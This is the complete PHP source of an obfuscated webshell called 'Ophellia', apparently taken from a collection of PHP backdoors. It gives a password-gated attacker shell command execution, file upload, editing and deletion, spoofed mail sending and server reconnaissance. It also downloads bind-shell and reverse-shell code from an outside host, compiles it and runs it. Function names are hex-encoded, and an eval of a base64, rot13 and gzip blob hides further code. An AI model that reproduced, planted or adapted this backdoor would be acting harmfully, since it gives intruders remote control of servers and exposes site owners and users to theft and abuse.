<?php
// from https://github.com/1337r0j4n/php-backdoors
/*
              Ophellia Webshell
            v1.3.1 - 'Neko Hacker'
          copyright @elliottophellia

           illegal use is prohibited
      github.com/elliottophellia/ophellia
*/
$pass = '21232f297a57a5a743894a0e4a801fc3'; // admin
function hlx($rr)
{
  $xx = '';
  for ($c = 0; $c < strlen($rr); $c += 2) {
    $xx .= chr(hexdec($rr[$c] . $rr[$c + 1]));
  }
  return $xx;
}
function xlh($string)
{
  $hex = '';
  for ($i = 0; $i < strlen($string); $i++) $hex .= dechex(ord($string[$i]));
  return $hex;
}
function sf($f, $t)
{
  $w = @fopen($f, "w") or @"\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"('file_put_contents');
  if ($w) {
    @fwrite($w, $t) or @fputs($w, $t) or @"\x66\x69\x6C\x65\x5F\x70\x75\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"($f, $t);
    @fclose($w);
  }
}
function fsize($file)
{
  $a = ["B", "KB", "MB", "GB", "TB", "PB"];
  $size = "\x66\x69\x6c\x65\x73\x69\x7a\x65"($file);
  $pos = min((int)log($size, 1024), count($a) - 1);
  $size /= pow(1024, $pos);
  return round($size, 2) . " " . $a[$pos];
}
function lasmod($file)
{
  return date("d/m/y - H:i:s", "\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"($file));
}
function perms($file)
{
  if ($perms = @"\x66\x69\x6c\x65\x70\x65\x72\x6d\x73"($file)) {
    $flag = '-';
    $flagTypes = [0xC000 => 's', 0xA000 => 'l', 0x8000 => '-', 0x6000 => 'b', 0x4000 => 'd', 0x2000 => 'c', 0x1000 => 'p',];
    foreach ($flagTypes as $mask => $type) {
      if (($perms & $mask) == $mask) {
        $flag = $type;
        break;
      }
    }
    $permissions = [00400 => 'r', 00200 => 'w', 00100 => 'x', 00040 => 'r', 00020 => 'w', 00010 => 'x', 00004 => 'r', 00002 => 'w', 00001 => 'x',];
    foreach ($permissions as $mask => $permission) {
      $flag .= ($perms & $mask) ? $permission : '-';
    }
    return $flag;
  } else {
    return substr(sprintf('%o', fileperms($file)), -4);
  }
}
function goog($item)
{
  $downer = "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"("posix_getpwuid") ? @"\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"("\x66\x69\x6c\x65\x6f\x77\x6e\x65\x72"($item))['name'] : "\x66\x69\x6c\x65\x6f\x77\x6e\x65\x72"($item);
  $dgrp = "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"("posix_getgrgid") ? @"\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"("\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"($item))['name'] : "\x66\x69\x6c\x65\x67\x72\x6f\x75\x70"($item);
  return $downer . '/' . $dgrp;
}
function gtyp($file)
{
  $gtyp = ("\x66\x75\x6E\x63\x74\x69\x6F\x6E\x5F\x65\x78\x69\x73\x74\x73"('mime_content_type')) ? "\x6d\x69\x6d\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x5f\x74\x79\x70\x65"($file) : "\x66\x69\x6c\x65\x74\x79\x70\x65"($file);
  return $gtyp;
}
"\x65\x72\x72\x6F\x72\x5F\x72\x65\x70\x6F\x72\x74\x69\x6E\x67"(0);
"\x73\x65\x74\x5F\x74\x69\x6D\x65\x5F\x6C\x69\x6D\x69\x74"(0);
"\x6F\x62\x5F\x73\x74\x61\x72\x74"();
"\x69\x6E\x69\x5F\x73\x65\x74"('max_execution_time', 0);
"\x69\x6E\x69\x5F\x73\x65\x74"('output_buffering', 0);
"\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
echo '<html><head><title>o p h e l l i a</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><style>@import url(//rei.my.id/style.css);</style><body>';
if ("\x6D\x64\x35"(${"\x5f\x50\x4f\x53\x54"}['pass']) == $pass) {
  "\x73\x65\x73\x73\x69\x6F\x6E\x5F\x73\x74\x61\x72\x74"();
  ${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass'] = $pass;
}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
  if ("\x69\x6E\x69\x5F\x67\x65\x74"('safe_mode')) {
    $Safe = "<b>ON</b>";
  } else {
    $Safe = "<b>OFF</b>";
  }
  if (isset(${"\x5F\x47\x45\x54"}['d'])) {
    $path = hlx(${"\x5F\x47\x45\x54"}['d']);
    "\x63\x68\x64\x69\x72"(hlx(${"\x5F\x47\x45\x54"}['d']));
  } else {
    $path = "\x67\x65\x74\x63\x77\x64"();
  }
  if (isset($mkdir)) {
    $mkdir = $path . "/" . ${"\x5F\x47\x45\x54"}['mkdir'];
  }
  if (isset($mkfile)) {
    $mkfile = $path . "/" . ${"\x5F\x47\x45\x54"}['mkfile'];
  }
  $f = hlx(${"\x5F\x47\x45\x54"}['f']);
  $fedit = hlx(${"\x5F\x47\x45\x54"}['fedit']);
  $gwejh = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['gwejh']);
  $mkdir = ${"\x5F\x47\x45\x54"}['mkdir'];
  $tools = ${"\x5F\x47\x45\x54"}['t'];
  $rmdir = hlx(${"\x5F\x47\x45\x54"}['rmdir']);
  $mkfile = ${"\x5F\x47\x45\x54"}['mkfile'];
  $cndir = ${"\x5F\x47\x45\x54"}['cndir'];
  $file = ${"\x5f\x53\x45\x52\x56\x45\x52"}['PHP_SELF'];
  $root = ${"\x5f\x53\x45\x52\x56\x45\x52"}['DOCUMENT_ROOT'];
  $bytes = "\x64\x69\x73\x6b\x5f\x66\x72\x65\x65\x5f\x73\x70\x61\x63\x65"(".");
  $rfile = hlx(${"\x5F\x47\x45\x54"}['rfile']);
  $rename = ${"\x5F\x47\x45\x54"}['rename'];
  $path = "\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65"('\\', '/', $path);
  $si_prefix = array('B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB');
  $class = min((int)log($bytes, 1024), count($si_prefix) - 1);
  $size = sprintf('%1.2f', $bytes / pow(1024, $class)) . ' ' . $si_prefix[$class];
  echo '<a href="?"><img src="//bit.ly/ophelliaa" width="380" /></a><br /><button><a href="?"><b>HOME</b><a></button> <button><a href="' . $file . '?t=' . xlh('upload') . '&d=' . xlh($path) . '"><b>UPLOAD</b></a></button> <button><a href="' . $file . '?t=' . xlh('network') . '&d=' . xlh($path) . '"><b>NETWORK</b></a></button> <button><a href="' . $file . '?t=' . xlh('mailer') . '&d=' . xlh($path) . '"><b>MAILER</b></a></button> <button><a href="' . $file . '?t=' . xlh('info') . '&d=' . xlh($path) . '"><b>INFO</b></a></button> <button><a href="' . $file . '?exit"><b>LOGOUT</b></a></button><br /><form method="post" action=""><input id="ememm" type="text" name="gwejh" value="uname -a"> <input type="submit" value="X" /></form><br /><form method="get" action=""><input id="emem" type="text" name="mkfile" value="CreateFile.php"> <input type="hidden" name="d" value="' . xlh($path) . '"> <input type="submit" value="X" /></form><form method="get" action=""><input id="emem" type="text" name="mkdir" placeholder="CreateDir"> <input type="hidden" name="d" value="' . xlh($path) . '"><input type="submit" value="X" /></form><br /><form method="get" action=""><input id="ememm" type="text" name="cndir" value=' . $path . '>&nbsp;<input type="submit" value="X" /></form>';
  if (isset($gwejh)) {
    if (!empty($gwejh)) {
      echo "<textarea rows=\"15\" name=\"text\" readonly>";
      echo "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"($gwejh);
      echo "</textarea>";
    }
  }
  if (isset($tools)) {
    if (hlx($tools) == 'network') {
      $pty = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/python.txt');
      $rby = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/ruby.txt');
      $bcc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/c.txt');
      $bcp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/back_connect/perl.txt');
      $bpc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/bind_shell/c.txt');
      $bpp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://rei.my.id/bind_shell/perl.txt');
      echo '<h2>Network Tools</h2><h3>Bind Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value="' . "\x67\x65\x74\x68\x6f\x73\x74\x62\x79\x6e\x61\x6d\x65"(${"\x5f\x53\x45\x52\x56\x45\x52"}['HTTP_HOST']) . '" readonly> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cb">C</option><option value="pb">Perl</option><option value="rbb">Ruby</option><option value="pyb">Python</option></select><input type="submit" value="Execute"/></form><br/><h3>Reverse Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value=""> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cbc">C</option><option value="pbc">Perl</option><option value="rbbc">Ruby</option><option value="pybc">Python</option></select><input type="submit" value="Execute"/></form>';
      if (isset(${"\x5f\x50\x4f\x53\x54"}['type'])) {
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'cb') {
              sf('/tmp/cb.c', $bpc);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('gcc -o /tmp/cb /tmp/cb.c');
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('/tmp/cb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep cb') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pb') {
              sf('/tmp/pb.pl', $bpp);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('perl /tmp/pb.pl ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pb') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'cbc') {
              sf('/tmp/cbc.c', $bcc);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('gcc -o /tmp/cbc /tmp/cbc.c');
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('/tmp/cbc ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep cbc') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pbc') {
              sf('/tmp/pbc.pl', $bcp);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('perl /tmp/pbc.pl ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pbc') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'rbb') {
              sf('/tmp/rbb.rb', $rby);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ruby /tmp/rbb.rb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep rbb') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'rbbc') {
              sf('/tmp/rbbc.rb', $rby);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ruby /tmp/rbbc.rb ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep rbbc') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pyb') {
              sf('/tmp/pyb.py', $pty);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('python /tmp/pyb.py ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pyb') . "<pre>";
          }
          if (${"\x5f\x50\x4f\x53\x54"}['type'] == 'pybc') {
              sf('/tmp/pybc.py', $pty);
              "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('python /tmp/pybc.py ' . ${"\x5f\x50\x4f\x53\x54"}['port'] . ' ' . ${"\x5f\x50\x4f\x53\x54"}['ip'] . ' &');
              echo "<pre>" . "\x73\x68\x65\x6C\x6C\x5F\x65\x78\x65\x63"('ps aux | grep pybc') . "<pre>";
          }
      }
      die();
  }
    if (hlx($tools) == 'mailer') {
      echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="ophellia@' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@rei.my.id"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"/></form><pre>';
      if (isset(${"\x5f\x50\x4f\x53\x54"}['from'])) {
        $headers = "From: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
        $headers .= "Reply-To: Ophellia <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
        $headers .= "Return-Path: " . ${"\x5f\x50\x4f\x53\x54"}['from'] . PHP_EOL;
        $headers .= "X-Mailer: Microsoft Outlook 16.0";
        "\x6d\x61\x69\x6c"(${"\x5f\x50\x4f\x53\x54"}['to'], ${"\x5f\x50\x4f\x53\x54"}['subject'], ${"\x5f\x50\x4f\x53\x54"}['message'], $headers);
        echo "Mail Sent !";
      }
      echo '</pre>';
      die();
    }
    if (hlx($tools) == 'upload') {
      echo "<h2>Upload Tools</h2><form method='post' enctype='multipart/form-data'><div style='justify-content: center'><input type='radio' name='uploadtype' value='1' checked>current_dir [ $path ]<br/><input type='radio' name='uploadtype' value='2'>document_root [ $root ]</div><br/><input type='file' name='upload'> <input type='submit' value='upload' name='upload'></form><br/>";
      if (isset(${"\x5f\x50\x4f\x53\x54"}['upload'])) {
        if (${"\x5f\x50\x4f\x53\x54"}['uploadtype'] == 1) {
          $tmp = $_FILES['upload']['tmp_name'];
          $up = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['upload']['name']);
          if ("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($tmp, $path . "/" . $up)) {
            echo "<b>SUCCESSFULLY UPLOADED</b>";
          } else {
            echo "<b>FAILED TO UPLOAD FILE</b>";
          }
        } else {
          $tmp = $_FILES['upload']['tmp_name'];
          $up = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['upload']['name']);
          if ("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($tmp, $root . "/" . $up)) {
            echo "<b>SUCCESSFULLY UPLOADED</b>";
          } else {
            echo "<b>FAILED TO UPLOAD FILE</b>";
          }
        }
      }
      die();
    }
    if (hlx($tools) == 'info') {
      $disable_functions = (!empty(@"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions'))) ? "<b>" . @"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions') . "</b>" : "<b>NONE</b>";
      echo "<div id=\"l\"><pre>System           : " . @"\x70\x68\x70\x5f\x75\x6e\x61\x6d\x65"('a') . " " . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_SOFTWARE'] . "<br/>User             : " . "\x67\x65\x74\x5f\x63\x75\x72\x72\x65\x6e\x74\x5f\x75\x73\x65\x72"() . "<br/>Free Space       : $size<br/>Server IP        : " . "\x67\x65\x74\x68\x6f\x73\x74\x62\x79\x6e\x61\x6d\x65"(${"\x5f\x53\x45\x52\x56\x45\x52"}['HTTP_HOST']) . "<br/>Client IP        : " . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . "<br/>Safe Mode        : $Safe<br/>PHP Version      : " . @"\x70\x68\x70\x76\x65\x72\x73\x69\x6f\x6e"() . "<br/>Disable Function : $disable_functions";
      echo "</pre></div>";
      die();
    }
  }
  if (isset($rfile) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($rfile)) {
    if ("\x75\x6e\x6c\x69\x6e\x6b"($rfile)) {
      echo ("<br/><b>File $rfile Deleted</b>");
    } else {
      echo ("<br/><b>File $rfile Not Deleted</b>");
    }
  }
  if (isset($mkdir)) {
    if (!empty($mkdir)) {
      if (mkdir($mkdir, 0777, true)) {
        echo "<br/><b>Directory $mkdir Created</b>";
      } else {
        echo "<br/><b>Directory $mkdir Not Created</b>";
      }
    } else {
      echo "<br/><b>Can't create folder with empty name</b>";
    }
  }
  if (isset($mkfile)) {
    echo '<form method="post" action=""><textarea rows="25" name="ftext"></textarea><br><div id="l"><br/><input type="text" name="fname" value="' . $mkfile . '"\> <input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div></form><br/>';
    if (!empty(${"\x5f\x50\x4f\x53\x54"}['fname'])) {
      if (${"\x5f\x50\x4f\x53\x54"}['fname'] && ${"\x5f\x50\x4f\x53\x54"}['ftext']) {
        if ("\x66\x69\x6C\x65\x5F\x70\x75\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73"(${"\x5f\x50\x4f\x53\x54"}['fname'], ${"\x5f\x50\x4f\x53\x54"}['ftext'])) {
          echo "<br/><b>File " . ${"\x5f\x50\x4f\x53\x54"}['fname'] . " Created</b>";
        } else {
          echo "<br/><b>File " . ${"\x5f\x50\x4f\x53\x54"}['fname'] . " Not Created</b>";
        }
      }
    } else {
      echo "<br/><b>Can't create file with empty name</b>";
    }
  }
  if (isset($rmdir) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($rmdir)) {
    if ("\x72\x6d\x64\x69\x72"($rmdir)) {
      echo "<br/><b>Directory $rmdir Deleted</b>";
    } else {
      echo "<br/><b>Directory $rmdir Not Deleted</b>";
    }
  }
  if (isset($cndir)) {
    $dir = $cndir;
    $rr = ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . "$file?d=" . xlh($dir);
    header("Location: http://$rr");
  }
  if (isset($rename)) {
    echo '<br/><br/><form method="post" action="">Old Name: <input type="text" name="oldname" value="' . hlx(${"\x5F\x47\x45\x54"}['oldname']) . '" readonly> New Name: <input type="text" name="newname" value=""> <input type="submit" value="Execute"/> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></form><pre>';
    if (${"\x5f\x50\x4f\x53\x54"}['oldname'] && ${"\x5f\x50\x4f\x53\x54"}['newname']) {
      if (isset(${"\x5f\x50\x4f\x53\x54"}['oldname'])) {
        rename(${"\x5f\x50\x4f\x53\x54"}['oldname'], ${"\x5f\x50\x4f\x53\x54"}['newname']);
        echo '<b>Rename File Done.</b><br />';
      } else {
        echo '<b>Rename File Failed.</b><br />';
      }
    }
    echo '</pre>';
  }
  if (isset($f) and "\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"($f)) {
    $text = "\x68\x74\x6d\x6c\x65\x6e\x74\x69\x74\x69\x65\x73"("\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($f));
    echo '<textarea rows="25" name="text" readonly>' . $text . '</textarea><br/><br/><div id="l"><button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div>';
  }
  if (isset($fedit) and "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65"($fedit)) {
    $text = "\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73"("\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($fedit));
    echo '<form method="post" action=""><textarea rows="25" name="text">' . $text . '</textarea><br><br/><div id="l"><input type="submit" value="Save"\> <button><a href="' . $file . '?d=' . xlh($path) . '">Back</a></button></div></form><br/>';
    if ("\x66\x69\x6C\x65\x5F\x65\x78\x69\x73\x74\x73"($fedit)) {
      if (isset(${"\x5f\x50\x4f\x53\x54"}['text'])) {
        $write = fopen($fedit, 'w');
        $new_text = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['text']);
        if (fwrite($write, $new_text)) {
          echo '<b>Edit File Done.</b><br />';
        } else {
          echo '<b>Edit File Failed.</b><br />';
        }
        fclose($write);
      }
    }
  }
  echo '<br /><table><thead><tr><th style="width:35%"> File Name </th><th style="width:7%"> Actions </th><th style="width:5%"> Filesize </th><th style="width:5%"> Filetype </th><th style="width:5%"> Permission </th><th style="width:8%"> Owner / Group </th><th style="width:8%"> Last Modified </th></tr></thead><tbody>';
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    if (!is_dir($files)) continue;
    if ($files == ".." | $files == ".") {
      echo "<tr>\n                  <td><img src='//rei.my.id/fldr.png' /><b><a href='?d=" . xlh("\x64\x69\x72\x6e\x61\x6d\x65"($path)) . "'>$files</a></b></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";
    } else {
      echo "<tr><td><img src='//rei.my.id/fldr.png' /><b><a href=$file?d=" . xlh($path . '/' . $files) . ">$files</a></b></td><td id='c'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; / <a href=$file?rmdir=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n                  <td id='c'>-</td>\n                  <td id='c'>" . gtyp($files) . "</td>\n                  <td id='c'>" . perms($files) . "</td>\n                  <td id='c'>" . goog($files) . "</td>\n                  <td id='c'>" . lasmod($files) . "</td>\n              </tr>";
    }
  }
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    if (!is_file($files)) continue;
    echo "<tr><td><img src='//rei.my.id/file.png' /><a href=$file?f=" . xlh($files) . " &d=" . xlh($path) . ">$files</a></td><td id='c'><a href=$file?fedit=" . xlh($files) . "&d=" . xlh($path) . ">ED</a> / <a href=$file?rfile=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n            <td id='c'>" . fsize($files) . "</td>\n            <td id='c'>" . gtyp($files) . "</td>\n            <td id='c'>" . perms($files) . "</td>\n            <td id='c'>" . goog($files) . "</td>\n            <td id='c'>" . lasmod($files) . "</td>\n        </tr>";
  }
  echo "</tbody></table><div id='r'><a href='//github.com/elliottophellia'>@elliottophellia</a></div>";
  if (isset(${"\x5F\x47\x45\x54"}['exit'])) {
    unset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']);
    echo "<script>window.location.href='?';</script>";
    exit();
  }
} else {
  echo '<img src="//bit.ly/ophellia" width="200" /><br/><form action="" method="post"><input type="password" name="pass" style="border: none;"></form>';
}
header('X-Powered-By: Ophellia v1.3.1');
echo '</body></html>';
